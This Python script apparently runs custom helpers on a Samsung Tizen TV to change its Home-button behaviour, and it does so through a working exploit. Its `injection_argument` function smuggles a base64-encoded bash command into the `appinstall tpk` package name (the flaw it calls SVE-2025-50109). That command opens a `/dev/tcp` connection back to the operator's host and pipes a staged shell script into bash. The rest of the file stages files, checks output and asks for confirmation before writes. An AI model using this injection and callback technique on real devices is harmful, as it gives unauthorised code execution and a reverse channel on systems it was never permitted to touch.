#!/usr/bin/env python3
"""Stage and run the guarded native Home helpers on a Samsung Tizen TV over SDB.

This is the runner `docs/setup-tv.md` refers to. There is no public Samsung API
for any of it; it uses the SVE-2025-50109 "package-name" injection to run a shell
script on the TV as uid=901 (the SDK user, *not* root), stages the reviewed
helper beside it, streams the output back over a loopback TCP callback, and
leaves no permanent device state.

    python3 scripts/native-home/run.py <inspect|query|verify|apply|restore> [baseline.json]

`inspect` and `query` are read-only. `verify`, `apply` and `restore` need a
saved baseline JSON and are gated (see `baseline_problems` and `confirm_apply`).

Config comes from `device.local.json` beside this file (gitignored; copy the
`.example`) and may be overridden by environment variables. See the README in
this directory and `docs/setup-tv.md` before running anything that writes.
"""

from __future__ import annotations

import base64
import ipaddress
import json
import os
import socket
import subprocess
import sys
import time
import urllib.request
import uuid
from pathlib import Path

# inspect and query use the read-only Arn0HomeQuery assembly; the rest use
# Arn0HomeControl. Keeping the two separate means the write-capable assembly is
# only ever staged for a mode that has been through the gate below.
MODES = ("inspect", "query", "verify", "apply", "restore")
READ_ONLY_MODES = ("inspect", "query")
BASELINE_MODES = ("verify", "apply", "restore")

DEFAULT_MODEL = "QE65LS03BAUXXU"
DEFAULT_FIRMWARE = "T-PTMDEUC-1720.7"
STAGE_DIR = "/home/owner/share/tmp/sdk_tools"
REMOTE_BASELINE = STAGE_DIR + "/Arn0HomeOriginal.json"

# The reviewed transport: the whole `sdb shell` argument has to stay under 400
# bytes, so the injected script is base64-encoded to keep it short and to avoid
# any shell-special characters in the package name.
MAX_ARGUMENT_BYTES = 400
MAX_OUTPUT_BYTES = 100_000
LISTENER_TIMEOUT = 18
CAPTURE_TIMEOUT = 8

REQUIRED_KEYS = (
    "db/appfw/home_appid",
    "db/appfw/startup_appid",
    "db/appfw/booting_appid_backup",
    "db/first_screen/type",
)

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[1]
CONFIG_PATH = HERE / "device.local.json"
OUT_DIR = HERE / "out"

ENV_MAP = {
    "host": "ARN0_TV_IP",
    "model": "ARN0_MODEL",
    "firmware": "ARN0_FIRMWARE",
    "sdb": "ARN0_SDB",
    "dotnet": "ARN0_DOTNET",
    "helper_dir": "ARN0_HELPER_DIR",
}


# --------------------------------------------------------------------------
# Pure helpers (no I/O) — these are what test_run.py exercises.
# --------------------------------------------------------------------------


def helper_name(mode: str) -> str:
    """The assembly a mode needs: the read-only query, or the write-capable control."""
    return "Arn0HomeQuery" if mode in READ_ONLY_MODES else "Arn0HomeControl"


def helper_files(mode: str) -> list[str]:
    """The three files every .NET assembly needs to run: dll, runtimeconfig, deps."""
    base = helper_name(mode)
    return [base + suffix for suffix in (".dll", ".runtimeconfig.json", ".deps.json")]


def success_token(mode: str) -> str:
    """The string that proves the helper reached the end of what was asked of it."""
    return {
        "inspect": "ARN0_INSPECT_END",
        "query": "QUERY_END",
        "verify": "ARN0_BASELINE_MATCH=",
        "apply": "ARN0_APPLIED=",
        "restore": "ARN0_RESTORED=",
    }[mode]


def failure_tokens(mode: str) -> tuple[str, ...]:
    """The strings the helpers print on their stderr when a guard or a call fails."""
    return ("QUERY_ABORTED=",) if mode == "query" else ("ARN0_ABORTED=",)


def check_output(mode: str, text: str) -> tuple[bool, str]:
    """Decide whether captured TV output means the operation completed.

    A missing end marker is treated as unknown state, not success: the script may
    have been cut off mid-write.
    """
    if "ARN0_RUN_END" not in text:
        return False, (
            "the script did not reach its end marker; device state is unknown. "
            "Inspect the current values before retrying."
        )
    for token in failure_tokens(mode):
        if token in text:
            return False, "the helper reported a failure (" + token.rstrip("=") + ")."
    if success_token(mode) not in text:
        return False, "expected " + success_token(mode) + " in the output but did not see it."
    return True, ""


def baseline_shape_problems(data: object) -> list[str]:
    """Structural checks, the same ones Control.cs makes when it loads a snapshot.

    This governs every baseline mode (`verify`, `apply`, `restore`): a baseline
    that is not shaped the way Control.cs expects must never be staged.
    """
    problems: list[str] = []
    if not isinstance(data, dict):
        return ["baseline is not a JSON object"]
    home = data.get("Home")
    strings = data.get("Strings")
    autostart = data.get("Autostart")
    if not isinstance(home, str) or not home.strip():
        problems.append("Home is missing")
    if not isinstance(strings, dict) or len(strings) != len(REQUIRED_KEYS):
        problems.append("Strings must hold exactly these keys: " + ", ".join(REQUIRED_KEYS))
    else:
        for key in REQUIRED_KEYS:
            value = strings.get(key)
            if not isinstance(value, str) or not value.strip():
                problems.append("Strings is missing " + key)
    if isinstance(autostart, bool) or not isinstance(autostart, int) or autostart not in (0, 1):
        problems.append("Autostart must be 0 or 1")
    return problems


def apply_gate_problems(data: object) -> list[str]:
    """The one policy gate, and only for `apply`.

    The reference TV had `auto_start = 1`; arn0's guide says to stop and research
    the `0` case before applying. `verify` and `restore` are deliberately *not*
    gated by this — restore is the way back and must always be available.
    """
    autostart = data.get("Autostart") if isinstance(data, dict) else None
    if autostart == 0:
        return [
            "Autostart is 0. The reference TV had 1 and arn0's guide says to stop and "
            "research this configuration before applying, and the S90D work this method "
            "comes from saw no foreground boot with auto_start 0. `apply` is refused; "
            "`verify` and `restore` still work."
        ]
    return []


def build_config(env: dict, file_values: dict | None) -> dict:
    """Merge defaults, then device.local.json, then environment (env wins)."""
    cfg = {
        "host": "",
        "model": DEFAULT_MODEL,
        "firmware": DEFAULT_FIRMWARE,
        "sdb": "sdb",
        "dotnet": "/usr/bin/dotnet",
        "helper_dir": str(ROOT / "native" / "build"),
    }
    for key, value in (file_values or {}).items():
        if value is not None:
            cfg[key] = value
    for key, name in ENV_MAP.items():
        if env.get(name):
            cfg[key] = env[name]
    return cfg


def config_problems(cfg: dict) -> list[str]:
    """Problems that make the runner unable to start, checked before anything is staged."""
    problems: list[str] = []
    host = str(cfg.get("host", "")).strip()
    try:
        ipaddress.ip_address(host)
    except ValueError:
        problems.append(
            "host must be a plain IPv4/IPv6 address; set it in device.local.json "
            "or ARN0_TV_IP (see device.local.example.json)"
        )
    if not str(cfg.get("sdb", "")).strip():
        problems.append("sdb path is empty")
    return problems


def model_mismatch(expected: str, reported: str | None) -> bool:
    """True only on a clear mismatch; an absent/masked model is not a mismatch."""
    if not expected or not reported or reported == "Unknown":
        return False
    return not (reported == expected or expected in reported or reported in expected)


def injection_argument(local_ip: str, port: int, remote_script: str, token: str) -> str:
    """The crafted `appinstall tpk` argument that runs the staged script as uid=901.

    Kept in one place with its length cap so a change cannot silently exceed the
    reviewed transport budget.
    """
    command = (
        "exec 3<>/dev/tcp/" + local_ip + "/" + str(port) + ";"
        "cat " + remote_script + "|bash >&3 2>&3;exec 3>&-"
    )
    script = "/bin/mkdir /tmp/s-" + token + " 2>/dev/null&&{ " + command + ";}"
    encoded = base64.b64encode(script.encode()).decode()
    name = "new2.tpk`printf${IFS}%s${IFS}" + encoded + "|base64${IFS}-d|bash`.tpk"
    return "0 appinstall tpk " + name


# --------------------------------------------------------------------------
# I/O
# --------------------------------------------------------------------------


def load_config() -> dict:
    file_values = None
    if CONFIG_PATH.exists():
        file_values = json.loads(CONFIG_PATH.read_text())
    return build_config(dict(os.environ), file_values)


def run_sdb(cfg: dict, args: list[str], timeout: int = 12) -> subprocess.CompletedProcess:
    try:
        proc = subprocess.run(
            [cfg["sdb"], *args], capture_output=True, text=True, timeout=timeout
        )
    except FileNotFoundError as exc:
        raise RuntimeError("sdb not found at " + str(cfg["sdb"]) + " — set it in device.local.json") from exc
    if proc.returncode:
        raise RuntimeError("SDB transport failed: " + (proc.stdout[-300:] + proc.stderr[-300:]))
    return proc


def preflight(cfg: dict) -> str:
    """Best-effort host-side model check. Returns a note; raises on a clear mismatch."""
    url = "http://" + cfg["host"] + ":8001/api/v2/"
    try:
        with urllib.request.urlopen(url, timeout=4) as response:
            info = json.load(response)
    except Exception as exc:  # noqa: BLE001 - any failure just means "cannot check here"
        return "could not read the TV info endpoint (" + str(exc) + "); relying on the helper guards"
    reported = (info.get("device") or {}).get("modelName")
    if model_mismatch(str(cfg.get("model", "")), reported):
        raise SystemExit(
            "Model guard failed: the TV reports " + str(reported) + ", expected "
            + str(cfg["model"]) + ". Nothing was staged."
        )
    if not reported or reported == "Unknown":
        return "the TV masked its model name; relying on the helper guards"
    return "TV reports " + str(reported)


def local_ip_for(host: str) -> str:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
        route.connect((host, 9))
        return route.getsockname()[0]


def confirm_apply() -> bool:
    """An explicit, human confirmation before the one mode that writes."""
    if os.environ.get("ARN0_CONFIRM_APPLY") == "1":
        return True
    if not sys.stdin.isatty():
        print(
            "apply: stdin is not a terminal, so nothing can be confirmed. "
            "Set ARN0_CONFIRM_APPLY=1 to confirm non-interactively.",
            file=sys.stderr,
        )
        return False
    reply = input("Type APPLY to redirect this TV's Home button to the launcher: ")
    return reply.strip() == "APPLY"


def execute_on_tv(cfg: dict, mode: str, baseline_path: Path | None) -> str:
    """Stage the mode's helper and script, run the injection, capture the output."""
    serial = cfg["host"] + ":26101"
    run_sdb(cfg, ["connect", serial])

    helper_dir = Path(cfg["helper_dir"])
    if not helper_dir.is_absolute():
        helper_dir = ROOT / helper_dir
    for name in helper_files(mode):
        source = helper_dir / name
        if not source.is_file():
            raise RuntimeError(
                "missing helper file " + str(source)
                + " — run `npm run native:build` first (needs the .NET SDK)"
            )
        run_sdb(cfg, ["-s", serial, "push", str(source), STAGE_DIR + "/" + name])
    if mode in BASELINE_MODES:
        run_sdb(cfg, ["-s", serial, "push", str(baseline_path), REMOTE_BASELINE])

    token = uuid.uuid4().hex[:12]
    remote = STAGE_DIR + "/arn0-" + token + ".sh"
    run_sdb(cfg, ["-s", serial, "push", str(HERE / (mode + ".sh")), remote])

    local_ip = local_ip_for(cfg["host"])
    with socket.socket() as listener:
        listener.bind((local_ip, 0))
        listener.listen(1)
        listener.settimeout(LISTENER_TIMEOUT)
        port = listener.getsockname()[1]

        argument = injection_argument(local_ip, port, remote, token)
        if len(argument.encode()) > MAX_ARGUMENT_BYTES:
            raise SystemExit("Command exceeds the reviewed transport length; not executed.")

        proc = subprocess.Popen(
            [cfg["sdb"], "-s", serial, "shell", argument],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        try:
            connection, peer = listener.accept()
            if peer[0] != cfg["host"]:
                raise RuntimeError("Unexpected callback peer; no data accepted.")
            chunks: list[bytes] = []
            with connection:
                connection.settimeout(CAPTURE_TIMEOUT)
                while True:
                    chunk = connection.recv(65536)
                    if not chunk:
                        break
                    chunks.append(chunk)
                    if sum(map(len, chunks)) > MAX_OUTPUT_BYTES:
                        raise RuntimeError("Unexpectedly large diagnostic output.")
            output = b"".join(chunks).decode(errors="replace")
            try:
                stdout, stderr = proc.communicate(timeout=CAPTURE_TIMEOUT)
            except subprocess.TimeoutExpired:
                proc.terminate()
                stdout, stderr = proc.communicate(timeout=3)
        finally:
            if proc.poll() is None:
                proc.terminate()
                proc.communicate(timeout=3)

    OUT_DIR.mkdir(parents=True, exist_ok=True)
    (OUT_DIR / (mode + "-output.txt")).write_text(output)
    (OUT_DIR / (mode + "-transport.json")).write_text(
        json.dumps(
            {
                "mode": mode,
                "returncode": proc.returncode,
                "stdout": stdout,
                "stderr": stderr,
                "remote_script": remote,
                "time": time.time(),
            },
            indent=2,
        )
        + os.linesep
    )
    return output


def main(argv: list[str]) -> int:
    mode = argv[1] if len(argv) > 1 else ""
    if mode not in MODES:
        print("usage: run.py <" + "|".join(MODES) + "> [baseline.json]", file=sys.stderr)
        return 2

    baseline_path: Path | None = Path(argv[2]) if len(argv) > 2 else None
    cfg = load_config()
    problems = config_problems(cfg)
    if problems:
        for problem in problems:
            print("config: " + problem, file=sys.stderr)
        return 2

    if mode in BASELINE_MODES:
        if baseline_path is None:
            print("config: " + mode + " needs the path to a saved baseline JSON", file=sys.stderr)
            return 2
        if not baseline_path.is_file():
            print("config: no baseline file at " + str(baseline_path), file=sys.stderr)
            return 2
        try:
            baseline = json.loads(baseline_path.read_text())
        except json.JSONDecodeError as exc:
            print("baseline: not valid JSON (" + str(exc) + ")", file=sys.stderr)
            return 2
        shape_issues = baseline_shape_problems(baseline)
        if shape_issues:
            for issue in shape_issues:
                print("baseline: " + issue, file=sys.stderr)
            return 2
        if mode == "apply":
            gate_issues = apply_gate_problems(baseline)
            if gate_issues:
                for issue in gate_issues:
                    print("baseline: " + issue, file=sys.stderr)
                return 2
            if not confirm_apply():
                print("apply: not confirmed; nothing was staged.", file=sys.stderr)
                return 2

    try:
        print("preflight: " + preflight(cfg))
        output = execute_on_tv(cfg, mode, baseline_path)
        print(output)
        ok, reason = check_output(mode, output)
        if not ok:
            print(mode + ": " + reason, file=sys.stderr)
            return 1
        print(mode + ": ok (output saved to " + str(OUT_DIR / (mode + "-output.txt")) + ")")
        return 0
    except RuntimeError as exc:
        print("error: " + str(exc), file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
